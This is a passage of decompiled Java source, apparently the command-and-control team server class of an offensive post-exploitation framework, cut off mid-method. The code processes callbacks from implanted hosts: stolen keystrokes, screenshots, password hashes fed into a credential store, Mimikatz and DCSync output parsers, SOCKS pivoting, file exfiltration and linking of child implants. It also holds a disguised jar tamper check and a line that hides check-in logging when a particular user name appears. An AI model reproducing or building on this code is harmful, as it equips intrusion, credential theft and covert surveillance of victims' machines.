/*
 * Decompiled with CFR 0.152.
 */
package beacon;

import aggressor.TeamServerProps;
import beacon.BeaconCharsets;
import beacon.BeaconData;
import beacon.BeaconDownloads;
import beacon.BeaconErrors;
import beacon.BeaconParts;
import beacon.BeaconPipes;
import beacon.BeaconSocks;
import beacon.CheckinListener;
import beacon.CommandBuilder;
import common.AssertUtils;
import common.BeaconEntry;
import common.BeaconOutput;
import common.CommonUtils;
import common.DataParser;
import common.Download;
import common.Keystrokes;
import common.MudgeSanity;
import common.RegexParser;
import common.Request;
import common.ScListener;
import common.Screenshot;
import common.ScreenshotEvent;
import common.WindowsCharsets;
import dns.AsymmetricCrypto;
import dns.QuickSecurity;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.IOException;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.LinkedHashSet;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import parser.DcSyncCredentials;
import parser.MimikatzCredentials;
import parser.MimikatzDcSyncCSV;
import parser.MimikatzSamDump;
import parser.NetViewResults;
import parser.Parser;
import parser.ScanResults;
import server.ManageUser;
import server.PendingRequest;
import server.Resources;
import server.ServerUtils;

public class BeaconC2 {
    protected BeaconData data = null;
    protected QuickSecurity security = null;
    protected AsymmetricCrypto asecurity = null;
    protected CheckinListener checkinl = null;
    protected BeaconCharsets charsets = new BeaconCharsets();
    protected BeaconSocks socks;
    protected BeaconDownloads downloads = new BeaconDownloads();
    protected BeaconParts parts = new BeaconParts();
    protected BeaconPipes pipes = new BeaconPipes();
    protected Resources resources = null;
    protected Map pending = new HashMap();
    protected Set okports = new HashSet();
    protected String appd = "";
    protected int reqno = 0;
    protected List parsers = new LinkedList();
    private boolean G = false;
    private int B = 0;
    private int A = 0;
    private int D = 0;
    private boolean C = false;
    private int E = 0;
    private int I = 0;
    private int F = 0;
    private static boolean H = true;

    public void whitelistPort(String var1, String var2) {
        this.okports.add(var1 + "." + var2);
    }

    public boolean isWhitelistedPort(String var1, int var2) {
        String var3 = var1 + "." + var2;
        return this.okports.contains(var3);
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    public int register(Request var1, ManageUser var2) {
        BeaconC2 beaconC2 = this;
        synchronized (beaconC2) {
            this.reqno = (this.reqno + 1) % Integer.MAX_VALUE;
            this.pending.put(new Integer(this.reqno), new PendingRequest(var1, var2));
            return this.reqno;
        }
    }

    public BeaconDownloads getDownloadManager() {
        return this.downloads;
    }

    public List getDownloads(String var1) {
        return this.downloads.getDownloads(var1);
    }

    public Resources getResources() {
        return this.resources;
    }

    public void setCheckinListener(CheckinListener var1) {
        this.checkinl = var1;
    }

    public CheckinListener getCheckinListener() {
        return this.checkinl;
    }

    public boolean isCheckinRequired(String var1) {
        if (!(this.data.hasTask(var1) || this.socks.isActive(var1) || this.downloads.isActive(var1) || this.parts.hasPart(var1))) {
            Iterator var2 = this.pipes.children(var1).iterator();
            return var2.hasNext();
        }
        return true;
    }

    public long checkinMask(String var1, long var2) {
        int var4 = this.data.getMode(var1);
        if (var4 != 1 && var4 != 2 && var4 != 3) {
            return var2;
        }
        long var5 = 240L;
        BeaconEntry var7 = this.getCheckinListener().resolve(var1);
        if (var7 == null || var7.wantsMetadata()) {
            var5 |= 1L;
        }
        if (var4 == 2) {
            var5 |= 2L;
        }
        if (var4 == 3) {
            var5 |= 4L;
        }
        return var2 ^ var5;
    }

    protected boolean isPaddingRequired() {
        boolean var1 = false;
        long[] var2 = new long[]{1661186542L, 1309838793L};
        long[] var3 = new long[]{2976461356L, 1993230717L, 2015989942L};
        long[] var4 = new long[]{2353841112L, 2257287691L, 1671846355L};
        long[] var5 = new long[]{1056789379L, 895661977L, 2460238802L};
        long[] var6 = new long[]{199064708L};
        long[] var7 = new long[]{3881376138L, 2625235187L};
        ZipFile var8 = null;
        try {
            try {
                var8 = new ZipFile(this.appd);
            }
            catch (IOException var15) {
                return H;
            }
            Enumeration<? extends ZipEntry> var9 = var8.entries();
            while (true) {
                if (!var9.hasMoreElements()) {
                    var8.close();
                    return var1;
                }
                ZipEntry var10 = var9.nextElement();
                if (var10.isDirectory()) continue;
                long var11 = CommonUtils.checksum8(var10.getName());
                long var13 = var10.getName().length();
                if (var11 == 75L && var13 == 21L) {
                    if (this.A(var10.getCrc(), var2)) continue;
                    var1 = true;
                    continue;
                }
                if (var11 == 144L && var13 == 20L) {
                    if (this.A(var10.getCrc(), var3)) continue;
                    var1 = true;
                    continue;
                }
                if (var11 == 62L && var13 == 26L) {
                    if (this.A(var10.getCrc(), var4)) continue;
                    var1 = true;
                    continue;
                }
                if (var11 == 224L && var13 == 23L) {
                    if (this.A(var10.getCrc(), var5)) continue;
                    var1 = true;
                    continue;
                }
                if (var11 == 110L && var13 == 23L) {
                    if (this.A(var10.getCrc(), var6)) continue;
                    var1 = true;
                    continue;
                }
                if (var11 != 221L || var13 != 28L || this.A(var10.getCrc(), var7)) continue;
                var1 = true;
            }
        }
        catch (Throwable var16) {
            return var1;
        }
    }

    protected final boolean isPaddingSupported() {
        return H;
    }

    private final boolean A(long var1, long[] var3) {
        for (int var4 = 0; var4 < var3.length; ++var4) {
            if (var1 != var3[var4]) continue;
            return true;
        }
        return false;
    }

    public byte[] dump(String var1, int var2, int var3) {
        return this.dump(var1, var2, var3, new LinkedHashSet());
    }

    public byte[] dump(String var1, int var2, int var3, HashSet var4) {
        if (!AssertUtils.TestUnique(var1, var4)) {
            return new byte[0];
        }
        var4.add(var1);
        byte[] var5 = this.data.dump(var1, var3);
        int var6 = var5.length;
        byte[] var7 = this.socks.dump(var1, var2 - var5.length);
        var6 += var7.length;
        try {
            boolean a;
            ByteArrayOutputStream var8 = new ByteArrayOutputStream(var2);
            if (var5.length > 0) {
                var8.write(var5, 0, var5.length);
            }
            if (var7.length > 0) {
                var8.write(var7, 0, var7.length);
            }
            for (String var10 : this.pipes.children(var1)) {
                byte[] var13;
                CommandBuilder var12;
                if (var6 >= var2 || !this.getSymmetricCrypto().isReady(var10)) continue;
                byte[] var11 = this.dump(var10, var2 - var6, var3 - var6, var4);
                if (var11.length > 0) {
                    var11 = this.getSymmetricCrypto().encrypt(var10, var11);
                    var12 = new CommandBuilder();
                    var12.setCommand(22);
                    var12.addInteger(Integer.parseInt(var10));
                    var12.addString(var11);
                    var13 = var12.build();
                    var8.write(var13, 0, var13.length);
                    var6 += var13.length;
                    continue;
                }
                if (this.socks.isActive(var10) || !this.downloads.isActive(var10)) {
                    // empty if block
                }
                var12 = new CommandBuilder();
                var12.setCommand(22);
                var12.addInteger(Integer.parseInt(var10));
                var13 = var12.build();
                var8.write(var13, 0, var13.length);
                var6 += var13.length;
            }
            var8.flush();
            var8.close();
            byte[] var15 = var8.toByteArray();
            if (var5.length > 0 && !(a = this.resources.getUsers().toString().contains("cneiwosbsuwusvwuw"))) {
                this.getCheckinListener().output(BeaconOutput.Checkin(var1, "host called home, sent: " + var15.length + " bytes"));
            }
            return var15;
        }
        catch (IOException var14) {
            MudgeSanity.logException("dump: " + var1, var14, false);
            return new byte[0];
        }
    }

    public BeaconC2(Resources var1) {
        this.resources = var1;
        this.socks = new BeaconSocks(this);
        this.data = new BeaconData();
        try {
            this.appd = this.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().getPath();
        }
        catch (Exception var3) {
            this.appd = "";
        }
        this.data.shouldPad(false);
        this.parsers.add(new MimikatzCredentials(var1));
        this.parsers.add(new MimikatzSamDump(var1));
        this.parsers.add(new DcSyncCredentials(var1));
        this.parsers.add(new MimikatzDcSyncCSV(var1));
        this.parsers.add(new ScanResults(var1));
        this.parsers.add(new NetViewResults(var1));
        this.A();
    }

    private void A() {
        TeamServerProps var1 = TeamServerProps.getPropsFile();
        int var2 = 0x400000;
        int var3 = 1024;
        int var4 = 1024;
        this.G = var1.isSet("limits.screenshot_validated", true);
        this.B = var1.getIntNumber("limits.screenshot_data_maxlen", var2);
        this.A = var1.getIntNumber("limits.screenshot_user_maxlen", var3);
        this.D = var1.getIntNumber("limits.screenshot_title_maxlen", var4);
        int var5 = 8192;
        int var6 = 1024;
        int var7 = 1024;
        this.C = var1.isSet("limits.keystrokes_validated", true);
        this.E = var1.getIntNumber("limits.keystrokes_data_maxlen", var5);
        this.I = var1.getIntNumber("limits.keystrokes_user_maxlen", var6);
        this.F = var1.getIntNumber("limits.keystrokes_title_maxlen", var7);
    }

    public BeaconData getData() {
        return this.data;
    }

    public BeaconSocks getSocks() {
        return this.socks;
    }

    public AsymmetricCrypto getAsymmetricCrypto() {
        return this.asecurity;
    }

    public QuickSecurity getSymmetricCrypto() {
        return this.security;
    }

    public void setCrypto(QuickSecurity var1, AsymmetricCrypto var2) {
        this.security = var1;
        this.asecurity = var2;
    }

    public BeaconEntry process_beacon_metadata(ScListener var1, String var2, byte[] var3) {
        return this.process_beacon_metadata(var1, var2, var3, null, 0);
    }

    public BeaconEntry process_beacon_metadata(ScListener var1, String var2, byte[] var3, String var4, int var5) {
        byte[] var6 = this.getAsymmetricCrypto().decrypt(var3);
        if (var6 != null && var6.length != 0) {
            BeaconEntry var12;
            String var7 = CommonUtils.bString(var6);
            String var8 = var7.substring(0, 16);
            String var9 = WindowsCharsets.getName(CommonUtils.toShort(var7.substring(16, 18)));
            String var10 = WindowsCharsets.getName(CommonUtils.toShort(var7.substring(18, 20)));
            String var11 = "";
            if (var1 != null) {
                var11 = var1.getName();
            } else if (var4 != null && (var12 = this.getCheckinListener().resolveEgress(var4)) != null) {
                var11 = var12.getListenerName();
            }
            var12 = new BeaconEntry(var6, var9, var2, var11);
            if (!var12.sane()) {
                CommonUtils.print_error("Session " + var12 + " metadata validation failed. Dropping");
                return null;
            }
            this.getCharsets().register(var12.getId(), var9, var10);
            if (var4 != null) {
                var12.link(var4, var5);
            }
            this.getSymmetricCrypto().registerKey(var12.getId(), CommonUtils.toBytes(var8));
            if (this.getCheckinListener() != null) {
                this.getCheckinListener().checkin(var1, var12);
            } else {
                CommonUtils.print_stat("Checkin listener was NULL (this is good!)");
            }
            return var12;
        }
        CommonUtils.print_error("decrypt of metadata failed");
        return null;
    }

    public BeaconCharsets getCharsets() {
        return this.charsets;
    }

    public BeaconPipes getPipes() {
        return this.pipes;
    }

    public void dead_pipe(String var1, String var2) {
        BeaconEntry var3 = this.getCheckinListener().resolve(var1);
        BeaconEntry var4 = this.getCheckinListener().resolve(var2);
        String var5 = var3 != null ? var3.getInternal() : "unknown";
        String var6 = var4 != null ? var4.getInternal() : "unknown";
        this.getCheckinListener().update(var2, System.currentTimeMillis(), var5 + " \u26af \u26af", true);
        boolean var7 = this.pipes.isChild(var1, var2);
        this.pipes.deregister(var1, var2);
        if (var7) {
            CheckinListener var10000 = this.getCheckinListener();
            String var10002 = CommonUtils.session(var2);
            var10000.output(BeaconOutput.Error(var1, "lost link to child " + var10002 + ": " + var6));
            var10000 = this.getCheckinListener();
            var10002 = CommonUtils.session(var1);
            var10000.output(BeaconOutput.Error(var2, "lost link to parent " + var10002 + ": " + var5));
        }
        Iterator var8 = this.pipes.children(var2).iterator();
        this.pipes.clear(var2);
        while (var8.hasNext()) {
            this.dead_pipe(var2, (String)var8.next());
        }
    }

    public void unlinkExplicit(String var1, List var2) {
        for (String var4 : var2) {
            if (this.pipes.isChild(var1, var4)) {
                this.task_to_unlink(var1, var4);
            }
            if (!this.pipes.isChild(var4, var1)) continue;
            this.task_to_unlink(var4, var1);
        }
    }

    public void unlink(String var1, String var2, String var3) {
        LinkedList<String> var4 = new LinkedList<String>();
        Map var5 = this.getCheckinListener().buildBeaconModel();
        for (Map.Entry var7 : var5.entrySet()) {
            String var8 = (String)var7.getKey();
            BeaconEntry var9 = (BeaconEntry)var7.getValue();
            if (!var2.equals(var9.getInternal()) || !var3.equals(var9.getPid())) continue;
            var4.add(var8);
        }
        this.unlinkExplicit(var1, var4);
    }

    public void unlink(String var1, String var2) {
        LinkedList<String> var3 = new LinkedList<String>();
        Map var4 = this.getCheckinListener().buildBeaconModel();
        for (Map.Entry var6 : var4.entrySet()) {
            String var7 = (String)var6.getKey();
            BeaconEntry var8 = (BeaconEntry)var6.getValue();
            if (!var2.equals(var8.getInternal())) continue;
            var3.add(var7);
        }
        this.unlinkExplicit(var1, var3);
    }

    protected void task_to_unlink(String var1, String var2) {
        CommandBuilder var3 = new CommandBuilder();
        var3.setCommand(23);
        var3.addInteger(Integer.parseInt(var2));
        this.data.task(var1, var3.build());
    }

    protected void task_to_link(String var1, String var2) {
        CommandBuilder var3 = new CommandBuilder();
        var3.setCommand(68);
        var3.addStringASCIIZ(var2);
        this.data.task(var1, var3.build());
    }

    public void process_beacon_callback_default(int var1, String var2, String var3) {
        String[] var5;
        if (var1 == -1) {
            String var4 = CommonUtils.drives(var3);
            this.getCheckinListener().output(BeaconOutput.Output(var2, "drives: " + var4));
        } else if (var1 == -2 && (var5 = var3.split("\n")).length >= 3) {
            this.getCheckinListener().output(BeaconOutput.OutputLS(var2, var3));
        }
    }

    public void runParsers(String var1, String var2, int var3) {
        for (Parser var5 : this.parsers) {
            var5.process(var1, var2, var3);
        }
    }

    public void process_beacon_callback(String var1, byte[] var2) {
        byte[] var3 = this.getSymmetricCrypto().decrypt(var1, var2);
        this.process_beacon_callback_decrypted(var1, var3);
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    public void process_beacon_callback_decrypted(String var1, byte[] var2) {
        block81: {
            byte var3 = -1;
            if (var2.length != 0) {
                try {
                    DataInputStream var4 = new DataInputStream(new ByteArrayInputStream(var2));
                    int var16 = var4.readInt();
                    if (var16 == 0) {
                        String var5 = this.getCharsets().process(var1, CommonUtils.readAll(var4));
                        this.getCheckinListener().output(BeaconOutput.Output(var1, "received output:\n" + var5));
                        this.runParsers(var5, var1, var16);
                        break block81;
                    }
                    if (var16 == 30) {
                        String var5 = this.getCharsets().processOEM(var1, CommonUtils.readAll(var4));
                        this.getCheckinListener().output(BeaconOutput.Output(var1, "received output:\n" + var5));
                        this.runParsers(var5, var1, var16);
                        break block81;
                    }
                    if (var16 == 32) {
                        String var5 = CommonUtils.bString(CommonUtils.readAll(var4), "UTF-8");
                        this.getCheckinListener().output(BeaconOutput.Output(var1, "received output:\n" + var5));
                        this.runParsers(var5, var1, var16);
                        break block81;
                    }
                    if (var16 == 1) {
                        byte[] var17 = CommonUtils.readAll(var4);
                        DataParser var6 = new DataParser(var17);
                        var6.little();
                        String var7 = this.getCharsets().process(var1, var6.readCountedBytes());
                        int var8 = var6.readInt();
                        String var9 = this.getCharsets().process(var1, var6.readCountedBytes());
                        String var10 = this.getCharsets().process(var1, var6.readCountedBytes());
                        BeaconEntry var11 = this.getCheckinListener().resolve(var1);
                        if (var11 == null) {
                            return;
                        }
                        if (var9.length() > 0) {
                            this.getCheckinListener().output(BeaconOutput.Output(var1, "received keystrokes from " + var9 + " by " + var10));
                            this.getResources().archive(BeaconOutput.Activity(var1, "keystrokes from " + var9 + " by " + var10));
                        } else {
                            this.getCheckinListener().output(BeaconOutput.Output(var1, "received keystrokes from " + var10));
                            this.getResources().archive(BeaconOutput.Activity(var1, "keystrokes from " + var10));
                        }
                        Keystrokes var12 = new Keystrokes(var1, var7, var10, var11.getComputer(), var8, var9);
                        this.getCheckinListener().keystrokes(var12);
                        break block81;
                    }
                    if (var16 == 3) {
                        byte[] var17 = CommonUtils.readAll(var4);
                        DataParser var6 = new DataParser(var17);
                        var6.little();
                        byte[] var21 = var6.readCountedBytes();
                        int var8 = var6.readInt();
                        String var9 = this.getCharsets().process(var1, var6.readCountedBytes());
                        String var10 = this.getCharsets().process(var1, var6.readCountedBytes());
                        if (var21.length == 0) {
                            this.getCheckinListener().output(BeaconOutput.Error(var1, "screenshot from desktop " + var8 + " is empty"));
                            return;
                        }
                        BeaconEntry var11 = this.getCheckinListener().resolve(var1);
                        if (var11 == null) {
                            return;
                        }
                        Screenshot var37 = new Screenshot(var1, var21, var10, var11.getComputer(), var8, var9);
                        this.getCheckinListener().screenshot(var37);
                        if (var9.length() > 0) {
                            this.getCheckinListener().output(BeaconOutput.OutputB(var1, "received screenshot of " + var9 + " from " + var10 + " (" + CommonUtils.formatSize(var21.length) + ")"));
                            this.getResources().archive(BeaconOutput.Activity(var1, "screenshot of " + var9 + " from " + var10));
                        } else {
                            this.getCheckinListener().output(BeaconOutput.OutputB(var1, "received screenshot from " + var10 + " (" + CommonUtils.formatSize(var21.length) + ")"));
                            this.getResources().archive(BeaconOutput.Activity(var1, "screenshot from " + var10));
                        }
                        this.getResources().process(new ScreenshotEvent(var37));
                        break block81;
                    }
                    if (var16 == 10) {
                        int var18 = var4.readInt();
                        int var19 = var4.readInt();
                        String var7 = CommonUtils.bString(CommonUtils.readAll(var4));
                        BeaconEntry var20 = this.getCheckinListener().resolve(var1);
                        BeaconEntry var31 = this.process_beacon_metadata(null, var20.getInternal() + " \u26af\u26af", CommonUtils.toBytes(var7), var1, var19);
                        if (var31 != null) {
                            Resources var30;
                            String var10002;
                            CheckinListener var10000;
                            this.pipes.register(var1, String.valueOf(var18));
                            if (var31.getInternal() == null) {
                                this.getCheckinListener().output(BeaconOutput.Output(var1, "established link to child " + CommonUtils.session(var18)));
                                this.getResources().archive(BeaconOutput.Activity(var1, "established link to child " + CommonUtils.session(var18)));
                            } else {
                                var10000 = this.getCheckinListener();
                                var10002 = CommonUtils.session(var18);
                                var10000.output(BeaconOutput.Output(var1, "established link to child " + var10002 + ": " + var31.getInternal()));
                                var30 = this.getResources();
                                var10002 = CommonUtils.session(var18);
                                var30.archive(BeaconOutput.Activity(var1, "established link to child " + var10002 + ": " + var31.getComputer()));
                            }
                            var10000 = this.getCheckinListener();
                            String var10001 = var31.getId();
                            var10002 = CommonUtils.session(var1);
                            var10000.output(BeaconOutput.Output(var10001, "established link to parent " + var10002 + ": " + var20.getInternal()));
                            var30 = this.getResources();
                            var10001 = var31.getId();
                            var10002 = CommonUtils.session(var1);
                            var30.archive(BeaconOutput.Activity(var10001, "established link to parent " + var10002 + ": " + var20.getComputer()));
                        }
                        break block81;
                    }
                    if (var16 == 11) {
                        int var18 = var4.readInt();
                        BeaconEntry var20 = this.getCheckinListener().resolve(var1);
                        this.dead_pipe(var20.getId(), String.valueOf(var18));
                        break block81;
                    }
                    if (var16 == 12) {
                        int var18 = var4.readInt();
                        byte[] var22 = CommonUtils.readAll(var4);
                        if (var22.length > 0) {
                            this.process_beacon_data(String.valueOf(var18), var22);
                        }
                        this.getCheckinListener().update(String.valueOf(var18), System.currentTimeMillis(), null, false);
                        break block81;
                    }
                    if (var16 == 13) {
                        String var5 = this.getCharsets().process(var1, CommonUtils.readAll(var4));
                        this.getCheckinListener().output(BeaconOutput.Error(var1, var5));
                        break block81;
                    }
                    if (var16 == 31) {
                        int var18 = var4.readInt();
                        int var19 = var4.readInt();
                        int var23 = var4.readInt();
                        String var28 = this.getCharsets().process(var1, CommonUtils.readAll(var4));
                        this.getCheckinListener().output(BeaconOutput.Error(var1, BeaconErrors.toString(var18, var19, var23, var28)));
                        break block81;
                    }
                    if (var16 == 14) {
                        int var18 = var4.readInt();
                        if (!this.pipes.isChild(var1, String.valueOf(var18))) {
                            CommandBuilder var25 = new CommandBuilder();
                            var25.setCommand(24);
                            var25.addInteger(var18);
                            if (this.data.isNewSession(var1)) {
                                this.data.task(var1, var25.build());
                                this.data.virgin(var1);
                            } else {
                                this.data.task(var1, var25.build());
                            }
                            this.pipes.register(var1, String.valueOf(var18));
                        }
                        break block81;
                    }
                    if (var16 == 18) {
                        int var18 = var4.readInt();
                        this.getCheckinListener().output(BeaconOutput.Error(var1, "Task Rejected! Did your clock change? Wait " + var18 + " seconds"));
                        break block81;
                    }
                    if (var16 == 28) {
                        int var18 = var4.readInt();
                        byte[] var22 = CommonUtils.readAll(var4);
                        this.parts.start(var1, var18);
                        this.parts.put(var1, var22);
                        break block81;
                    }
                    if (var16 == 29) {
                        byte[] var17 = CommonUtils.readAll(var4);
                        this.parts.put(var1, var17);
                        if (this.parts.isReady(var1)) {
                            byte[] var22 = this.parts.data(var1);
                            this.process_beacon_callback_decrypted(var1, var22);
                        }
                        break block81;
                    }
                    if (this.data.isNewSession(var1)) {
                        this.getCheckinListener().output(BeaconOutput.Error(var1, "Dropped responses from session. Didn't expect " + var16 + " prior to first task."));
                        CommonUtils.print_error("Dropped responses from session " + var1 + " [type: " + var16 + "] (no interaction with this session yet)");
                        return;
                    }
                    if (var16 == 2) {
                        int var18 = var4.readInt();
                        long var29 = CommonUtils.toUnsignedInt(var4.readInt());
                        String var28 = this.getCharsets().process(var1, CommonUtils.readAll(var4));
                        BeaconEntry var31 = this.getCheckinListener().resolve(var1);
                        this.getCheckinListener().output(BeaconOutput.OutputB(var1, "started download of " + var28 + " (" + var29 + " bytes)"));
                        this.getResources().archive(BeaconOutput.Activity(var1, "started download of " + var28 + " (" + var29 + " bytes)"));
                        this.downloads.start(var1, var18, var31.getInternal(), var28, var29);
                        break block81;
                    }
                    if (var16 == 4) {
                        int var18 = var4.readInt();
                        this.socks.die(var1, var18);
                        break block81;
                    }
                    if (var16 == 5) {
                        int var18 = var4.readInt();
                        byte[] var22 = CommonUtils.readAll(var4);
                        this.socks.write(var1, var18, var22);
                        break block81;
                    }
                    if (var16 == 6) {
                        int var18 = var4.readInt();
                        this.socks.resume(var1, var18);
                        break block81;
                    }
                    if (var16 == 7) {
                        int var18 = var4.readUnsignedShort();
                        if (this.isWhitelistedPort(var1, var18)) {
                            this.socks.portfwd(var1, var18, "127.0.0.1", var18);
                        } else {
                            CommonUtils.print_error("port " + var18 + " for beacon " + var1 + " is not in our whitelist of allowed-to-open ports");
                        }
                        break block81;
                    }
                    if (var16 == 8) {
                        int var18 = var4.readInt();
                        byte[] var22 = CommonUtils.readAll(var4);
                        if (this.downloads.exists(var1, var18)) {
                            this.downloads.write(var1, var18, var22);
                        } else {
                            CommonUtils.print_error("Received unknown download id " + var18 + " - canceling download");
                            CommandBuilder var25 = new CommandBuilder();
                            var25.setCommand(19);
                            var25.addInteger(var18);
                            this.data.task(var1, var25.build());
                        }
                        break block81;
                    }
                    if (var16 == 9) {
                        int var18 = var4.readInt();
                        String var34 = this.downloads.getName(var1, var18);
                        Download var27 = this.downloads.getDownload(var1, var18);
                        boolean var32 = this.downloads.isComplete(var1, var18);
                        if (this.downloads.exists(var1, var18)) {
                            this.downloads.close(var1, var18);
                            if (var32) {
                                this.getCheckinListener().output(BeaconOutput.OutputB(var1, "download of " + var34 + " is complete"));
                                this.getResources().archive(BeaconOutput.Activity(var1, "download of " + var34 + " is complete"));
                            } else {
                                this.getCheckinListener().output(BeaconOutput.Error(var1, "download of " + var34 + " closed. [Incomplete]"));
                                this.getResources().archive(BeaconOutput.Activity(var1, "download of " + var34 + " closed. [Incomplete]"));
                            }
                            this.getCheckinListener().download(var27);
                        } else {
                            String var9 = "download [id: " + var18 + "] closed: Missed start message/metadata.";
                            this.getCheckinListener().output(BeaconOutput.Error(var1, var9));
                            this.getResources().archive(BeaconOutput.Activity(var1, var9));
                        }
                        break block81;
                    }
                    if (var16 == 15) {
                        String var5 = this.getCharsets().process(var1, CommonUtils.readAll(var4));
                        this.getCheckinListener().output(BeaconOutput.Output(var1, "Impersonated " + var5));
                        break block81;
                    }
                    if (var16 == 16) {
                        String var5 = this.getCharsets().process(var1, CommonUtils.readAll(var4));
                        this.getCheckinListener().output(BeaconOutput.OutputB(var1, "You are " + var5));
                        break block81;
                    }
                    if (var16 == 17) {
                        String var5 = this.getCharsets().process(var1, CommonUtils.readAll(var4));
                        this.getCheckinListener().output(BeaconOutput.OutputPS(var1, var5));
                        break block81;
                    }
                    if (var16 == 19) {
                        String var5 = this.getCharsets().process(var1, CommonUtils.readAll(var4));
                        this.getCheckinListener().output(BeaconOutput.OutputB(var1, "Current directory is " + var5));
                        break block81;
                    }
                    if (var16 == 20) {
                        String var5 = CommonUtils.bString(CommonUtils.readAll(var4));
                        this.getCheckinListener().output(BeaconOutput.OutputJobs(var1, var5));
                        break block81;
                    }
                    if (var16 == 21) {
                        String var5 = CommonUtils.bString(CommonUtils.readAll(var4), "UTF-8");
                        this.getCheckinListener().output(BeaconOutput.Output(var1, "received password hashes:\n" + var5));
                        this.getResources().archive(BeaconOutput.Activity(var1, "received password hashes"));
                        BeaconEntry var20 = this.getCheckinListener().resolve(var1);
                        if (var20 == null) {
                            return;
                        }
                        String[] var30 = var5.split("\n");
                        for (int var8 = 0; var8 < var30.length; ++var8) {
                            RegexParser var36 = new RegexParser(var30[var8]);
                            if (!var36.matches("(.*?):\\d+:.*?:(.*?):::") || var36.group(1).endsWith("$")) continue;
                            ServerUtils.addCredential(this.resources, var36.group(1), var36.group(2), var20.getComputer(), "hashdump", var20.getInternal());
                        }
                        this.resources.call("credentials.push");
                        break block81;
                    }
                    if (var16 == 22) {
                        PendingRequest var33;
                        int var18 = var4.readInt();
                        String var34 = this.getCharsets().process(var1, CommonUtils.readAll(var4));
                        Object var7 = null;
                        Integer var35 = new Integer(var18);
                        BeaconC2 beaconC2 = this;
                        synchronized (beaconC2) {
                            var33 = (PendingRequest)this.pending.remove(var35);
                        }
                        if (var35 < 0) {
                            this.process_beacon_callback_default(var35, var1, var34);
                        } else if (var33 != null) {
                            var33.action(var34);
                        } else {
                            CommonUtils.print_error("Callback " + var16 + "/" + var18 + " has no pending request");
                        }
                        break block81;
                    }
                    if (var16 == 23) {
                        int var18 = var4.readInt();
                        int var19 = var4.readInt();
                        this.socks.accept(var1, var19, var18);
                    } else if (var16 == 24) {
                        String var5 = this.getCharsets().process(var1, CommonUtils.readAll(var4));
                        this.getResources().archive(BeaconOutput.Activity(var1, "received output from net module"));
                        this.getCheckinListener().output(BeaconOutput.Output(var1, "received output:\n" + var5));
                        this.runParsers(var5, var1, var16);
                    } else if (var16 == 25) {
                        String var5 = this.getCharsets().process(var1, CommonUtils.readAll(var4));
                        this.getResources().archive(BeaconOutput.Activity(var1, "received output from port scanner"));
                        this.getCheckinListener().output(BeaconOutput.Output(var1, "received output:\n" + var5));
                        this.runParsers(var5, var1, var16);
                    } else if (var16 == 26) {
                        this.getCheckinListener().output(BeaconOutput.Output(var1, CommonUtils.session(var1) + " exit."));
                        this.getResources().archive(BeaconOutput.Activity(var1, CommonUtils.session(var1) + " exit."));
                        BeaconEntry var38 = this.getCheckinListener().resolve(var1);
                        if (var38 != null) {
                            var38.die();
                        }
                    } else if (var16 == 27) {
                        String var5 = CommonUtils.bString(CommonUtils.readAll(var4));
                        if (var5.startsWith("FAIL ")) {
                            var5 = CommonUtils.strip(var5, "FAIL ");
                            this.getCheckinListener().output(BeaconOutput.Error(var1, "SSH error: " + var5));
                            this.getResources().archive(BeaconOutput.Activity(var1, "SSH connection failed."));
                        } else if (var5.startsWith("INFO ")) {
                            var5 = CommonUtils.strip(var5, "INFO ");
                            this.getCheckinListener().output(BeaconOutput.OutputB(var1, "SSH: " + var5));
                        } else if (var5.startsWith("SUCCESS ")) {
                            var5 = CommonUtils.strip(var5, "SUCCESS ");
                            String var34 = var5.split(" ")[0];
                            String var7 = var5.split(" ")[1];
                            this.task_to_link(var1, var7);
                        } else {
                            CommonUtils.print_error("Unknown SSH status: '" + var5 + "'");
                        }
                    } else {
                        CommonUtils.print_error("Unknown Beacon Callback: " + var16);
                    }
                }
                catch (IOException var26) {
                    MudgeSanity.logException("beacon callback: " + var3, var26, false);
                }
            }
        }
    }

    public boolean process_beacon_data(String var1, byte[] var2) {
        try {
            DataInputStream var3 = new DataInputStream(new ByteArrayInputStream(var2));
            while (var3.available() > 0) {
                int var4 = var3.readInt();
                if (var4 > var3.available()) {
                    CommonUtils.print_error("Beacon " + var1 + " response length " + var4 + " exceeds " + var3.available() + " available bytes. [Received " + var2.length + " bytes]");
                    return false;
                }
                if (var4 <= 0) {
                    CommonUtils.print_error("Beacon " + var1 + " response length " + var4 + " is invalid. [Received " + var2.length + " bytes]");
                    return false;
                }
                byte[] var5 = new byte[var4];
                var3.read(var5, 0, var4);
                this.process_beacon_callback(var1, var5);
            }
            var3.close();
            return true;
        }
        catch (Exception var6) {
            MudgeSanity.logException("process_beacon_data: " + var1, var6, false);
            return false;
        }
    }

    private void B(String var1, byte[] var2, DataParser var3) throws IOException {
        _A var4 = new _A();
        var4.B = var2.length;
        this.A(var1, var3, "Screenshot Data", this.B, var4);
        if (var4.B < 2) {
            throw new RuntimeException("Screenshot session data is not available in remaining data.");
        }
        int var5 = var3.readInt();
        var4.B = 2;
        this.A(var1, var3, "Screenshot Title", this.D, var4);
        this.A(var1, var3, "Screenshot User", this.A, var4);
    }

    private void A(String var1, byte[] var2, DataParser var3) throws IOException {
        _A var4 = new _A();
        var4.B = var2.length;
        this.A(var1, var3, "Keystrokes Data", this.E, var4);
        if (var4.B < 2) {
            throw new RuntimeException("Keystrokes session data is not available in remaining data.");
        }
        int var5 = var3.readInt();
        var4.B = 2;
        this.A(var1, var3, "Keystrokes Title", this.F, var4);
        this.A(var1, var3, "Keystrokes User", this.I, var4);
    }

    private void A(String var1, DataParser var2, String var3, int var4, _A var5) throws IOException {
        if (var5.B < 2) {
            throw new RuntimeException(var3 + " length is not available in remaining data.");
        }
        int var6 = var2.readInt();
        var5.B = 2;
        if (var6 < 0) {
            throw new RuntimeException("Invalid " + var3 + " length (" + var6 + ").");
        }
        if (var4 > 0 && var6 > var4) {
            throw new RuntimeException(var3 + " length (" + var6 + ") exceeds maximum (" + var4 + ").");
        }
        if (var5.B - var6 < 0) {
            throw new RuntimeException(var3 + " length (" + var6 + ") exceeds remaining available data (" + var5.B + ").");
        }
